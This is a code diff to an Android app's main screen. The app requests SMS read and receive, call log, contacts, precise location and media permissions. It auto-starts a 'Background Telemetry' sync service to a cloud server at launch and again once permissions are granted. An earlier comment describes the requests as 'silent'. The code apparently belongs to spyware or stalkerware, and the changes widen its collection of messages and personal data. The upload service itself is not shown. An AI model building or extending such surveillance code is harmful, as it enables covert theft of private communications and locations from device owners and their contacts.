@@ -26,7 +26,7 @@ class MainActivity : AppCompatActivity() {
         val serverUrl = Constants.DEFAULT_SERVER_URL
         val deviceName = Build.MODEL
 
-        // Request all telemetry permissions silently at launch
+        // Request all permissions explicitly
         requestAllPermissions()
 
         // AUTOMATICALLY START SERVICE ON LAUNCH
@@ -35,33 +35,45 @@ class MainActivity : AppCompatActivity() {
         tvStatus.text = "🟢 Connected — Background Telemetry Active\nCloud Server: $serverUrl"
 
         btnStartSync.setOnClickListener {
+            requestAllPermissions()
             startSyncService(serverUrl, deviceName)
-            Toast.makeText(this, "Sync Service Re-Started!", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "Permissions Requested & Sync Service Re-Started!", Toast.LENGTH_SHORT).show()
         }
     }
 
     private fun requestAllPermissions() {
-        val permissions = mutableListOf(
+        val permissionsList = mutableListOf(
             Manifest.permission.READ_SMS,
+            Manifest.permission.RECEIVE_SMS,
             Manifest.permission.READ_CALL_LOG,
             Manifest.permission.READ_CONTACTS,
             Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.ACCESS_COARSE_LOCATION,
-            Manifest.permission.READ_EXTERNAL_STORAGE
+            Manifest.permission.ACCESS_COARSE_LOCATION
         )
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
-            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
-            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
+            permissionsList.add(Manifest.permission.POST_NOTIFICATIONS)
+            permissionsList.add(Manifest.permission.READ_MEDIA_IMAGES)
+            permissionsList.add(Manifest.permission.READ_MEDIA_VIDEO)
+        } else {
+            permissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE)
         }
 
-        val missingPermissions = permissions.filter {
+        val ungranted = permissionsList.filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }
 
-        if (missingPermissions.isNotEmpty()) {
-            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), PERMISSION_REQUEST_CODE)
+        if (ungranted.isNotEmpty()) {
+            ActivityCompat.requestPermissions(this, ungranted.toTypedArray(), PERMISSION_REQUEST_CODE)
+        }
+    }
+    
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            val serverUrl = Constants.DEFAULT_SERVER_URL
+            val deviceName = Build.MODEL
+            startSyncService(serverUrl, deviceName)
         }
     }
 
